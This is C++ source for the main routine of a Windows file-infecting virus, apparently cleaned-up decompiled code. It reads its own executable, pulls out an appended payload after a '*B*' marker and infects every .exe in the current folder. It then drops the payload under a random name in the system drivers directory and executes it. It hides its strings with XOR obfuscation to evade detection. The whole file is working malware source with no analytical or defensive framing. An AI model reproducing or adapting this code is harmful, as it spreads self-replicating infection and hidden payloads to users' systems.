#include "data_globals.h"
#include <fstream>
#include <cstdlib>
#include <ctime>
#include <shellapi.h>
#include <cstring>
#pragma optimize("", off)

template<typename T>
static const char* to_const_char(const volatile T* p) {
    return reinterpret_cast<const char*>(const_cast<const T*>(p));
}

static void xor_decrypt(volatile unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    HMODULE hModule = GetModuleHandleA(nullptr);
    GetModuleFileNameA(hModule, Virus, 0x104);
    Secret(Virus);

    inf = 0x2a;
    DAT_140008165 = 0x42;
    DAT_140008166 = 0x2a;

    std::ifstream inFile(reinterpret_cast<const char*>(Virus), std::ios::in | std::ios::binary);
    inFile.seekg(0, std::ios::end);
    std::streampos pos = inFile.tellg();
    int fileSize = static_cast<int>(pos);
    inFile.seekg(0, std::ios::beg);

    // Cast malloc to char* to match VBuffer type (char*)
    VBuffer = static_cast<char*>(malloc(static_cast<size_t>(fileSize)));
    inFile.read(static_cast<char*>(VBuffer), fileSize);
    inFile.close();

    int markerPos = -1;
    for (int i = 0; i < fileSize; ++i) {
        if (VBuffer[i] == '*' && VBuffer[i + 1] == 'B' && VBuffer[i + 2] == '*') {
            markerPos = i;
            FBuffer = VBuffer + i + 3;
            break;
        }
    }

    volatile unsigned char sz_find_exe[] = { '*'^0x3A, '.'^0x3A, 'e'^0x3A, 'x'^0x3A, 'e'^0x3A, 0x00^0x3A };
    xor_decrypt(sz_find_exe, sizeof(sz_find_exe), 0x3A);
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(to_const_char(sz_find_exe), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            Infect(findData.cFileName, VBuffer);
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }

    time_t t = time(nullptr);
    srand(static_cast<unsigned int>(t));
    int randNum = rand();
    char randStr[16];
    sprintf_s(randStr, sizeof(randStr), "%d", randNum);

    CHAR systemPath[MAX_PATH];
    GetSystemDirectoryA(systemPath, MAX_PATH);
    volatile unsigned char sz_drivers[] = { '\\'^0x5C, 'd'^0x5C, 'r'^0x5C, 'i'^0x5C, 'v'^0x5C, 'e'^0x5C, 'r'^0x5C, 's'^0x5C, 0x00^0x5C };
    xor_decrypt(sz_drivers, sizeof(sz_drivers), 0x5C);
    strcat(systemPath, to_const_char(sz_drivers));
    strcat(systemPath, randStr);
    volatile unsigned char sz_exe[] = { '.'^0x7E, 'e'^0x7E, 'x'^0x7E, 'e'^0x7E, 0x00^0x7E };
    xor_decrypt(sz_exe, sizeof(sz_exe), 0x7E);
    strcat(systemPath, to_const_char(sz_exe));

    if (FBuffer != nullptr) {
        std::ofstream outFile(systemPath, std::ios::out | std::ios::binary);
        if (markerPos != -1) {
            int payloadSize = fileSize - (markerPos + 3);
            outFile.write(static_cast<const char*>(FBuffer), payloadSize);
        }
        outFile.close();
        ShellExecuteA(nullptr, nullptr, systemPath, nullptr, nullptr, 5);
    }

    Payload();
    return 0;
}
#pragma optimize("", on)
